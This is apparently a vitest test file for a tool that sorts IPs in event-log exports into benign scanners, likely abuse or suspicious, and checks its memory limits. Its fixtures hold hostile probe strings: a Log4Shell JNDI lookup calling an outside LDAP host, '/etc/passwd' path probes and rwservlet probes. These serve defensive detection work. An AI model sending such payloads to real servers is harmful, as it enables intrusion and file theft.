import { describe, it, expect } from 'vitest';
import { score, ScoreAccumulator } from './score.js';
import { DEFAULT_LIMITS, LimitReport } from '../limits.js';
import { ingress } from '../sanitizer/ingress.js';
import { Matcher } from './match.js';

const m = new Matcher();
const me = (row: Record<string, string>, type: string) => m.match(ingress(row, type));

describe('score', () => {
  it('returns BENIGN_SCANNER when probes are Class-1-only and responses are error/canned', () => {
    const events = [
      me({ URI: '/app/etc/passwd', CLIENT_IP: '203.0.113.10', IS_ERROR: '1', RESPONSE_SIZE: '0' }, 'Sites'),
      me({ URI: '/sfsites/${jndi:ldap://x.nessus.org}', CLIENT_IP: '203.0.113.10', IS_ERROR: '0', RESPONSE_SIZE: '419991' }, 'Sites'),
      me({ URI: '/sfsites/reports/rwservlet', CLIENT_IP: '203.0.113.10', IS_ERROR: '0', RESPONSE_SIZE: '419991' }, 'Sites'),
      me({ URI: '/login/reports/rwservlet', CLIENT_IP: '203.0.113.10', IS_ERROR: '0', RESPONSE_SIZE: '419991' }, 'Sites'),
    ];
    const [v] = score(events, []);
    expect(v.ip).toBe('203.0.113.10');
    expect(v.verdict).toBe('BENIGN_SCANNER');
    expect(v.confidence).toMatch(/not provable/i);
  });

  it('returns LIKELY_ABUSE when the IP has an sfExploitable match', () => {
    const events = [
      me({ QUERY: 'uiapi { query { Account { edges { node { Id } } } } }', CLIENT_IP: '5.5.5.5' }, 'GraphQlQueryExecution'),
    ];
    const [v] = score(events, []);
    expect(v.verdict).toBe('LIKELY_ABUSE');
  });

  it('returns LIKELY_ABUSE when a correlation exists even without an sfExploitable match', () => {
    const events = [me({ URI: '/login/', CLIENT_IP: '7.7.7.7' }, 'Sites')];
    const [v] = score(events, [{ ip: '7.7.7.7', kind: 'read-then-download', readTs: 1, downloadTs: 2 }]);
    expect(v.verdict).toBe('LIKELY_ABUSE');
  });

  it('counts one host reaching the org over IPv4 and IPv4-mapped IPv6 as a single identity', () => {
    const events = [
      me({ URI: '/app/etc/passwd', CLIENT_IP: '203.0.113.10' }, 'Sites'),
      me({ URI: '/app/etc/passwd', CLIENT_IP: '::ffff:203.0.113.10' }, 'Sites'),
    ];
    const verdicts = score(events, []);
    expect(verdicts).toHaveLength(1);
    expect(verdicts[0].totalReqs).toBe(2);
  });
});

// Peak memory must track distinct-IP cardinality, never row count: the pipeline used to
// buffer every event for the whole run, which is an out-of-memory failure on exactly the
// multi-gigabyte exports this tool is for.
describe('ScoreAccumulator: bounded state', () => {
  const m = new Matcher();
  const ev = (row: Record<string, string>, type = 'Sites') => m.match(ingress(row, type));

  it('folds many rows from one IP into one verdict without retaining them', () => {
    const acc = new ScoreAccumulator();
    for (let i = 0; i < 50_000; i++) {
      acc.add(ev({ URI: `/app/etc/passwd?n=${i}`, CLIENT_IP: '203.0.113.10' }));
    }
    const verdicts = acc.finish([]);
    expect(verdicts).toHaveLength(1);
    expect(verdicts[0].totalReqs).toBe(50_000);
  });

  it('caps distinct URIs per IP and reports the count as a floor', () => {
    const report = new LimitReport();
    const acc = new ScoreAccumulator({ ...DEFAULT_LIMITS, maxUrisPerIp: 10 }, report);
    for (let i = 0; i < 100; i++) {
      acc.add(ev({ URI: `/app/etc/passwd?n=${i}`, CLIENT_IP: '203.0.113.10' }));
    }
    const [v] = acc.finish([]);
    expect(v.distinctUris).toBe(10);
    expect(v.distinctUrisTruncated).toBe(true);
    expect(v.totalReqs).toBe(100); // the count itself stays exact
    expect(report.toJSON().maxUrisPerIp).toBeGreaterThan(0);
  });

  it('caps tracked IPs and records that the run is partial', () => {
    const report = new LimitReport();
    const acc = new ScoreAccumulator({ ...DEFAULT_LIMITS, maxIps: 3 }, report);
    for (let i = 0; i < 20; i++) {
      acc.add(ev({ URI: '/app/etc/passwd', CLIENT_IP: `203.0.113.${i}` }));
    }
    expect(acc.finish([])).toHaveLength(3);
    expect(report.truncated).toBe(true);
  });

  it('downgrades toward SUSPICIOUS rather than clearing an IP on truncated size detail', () => {
    const report = new LimitReport();
    const acc = new ScoreAccumulator({ ...DEFAULT_LIMITS, maxResponseSizesPerIp: 2 }, report);
    // Many distinct sizes: the canned-page test cannot be evaluated completely.
    for (let i = 0; i < 30; i++) {
      acc.add(
        ev({ URI: '/app/etc/passwd', CLIENT_IP: '203.0.113.10', IS_ERROR: '1', RESPONSE_SIZE: String(i) }),
      );
    }
    const [v] = acc.finish([]);
    expect(v.allResponsesErrorOrCanned).toBe(false);
    expect(v.verdict).toBe('SUSPICIOUS');
    expect(v.reasons.join(' ')).toMatch(/not conclusive/i);
  });
});
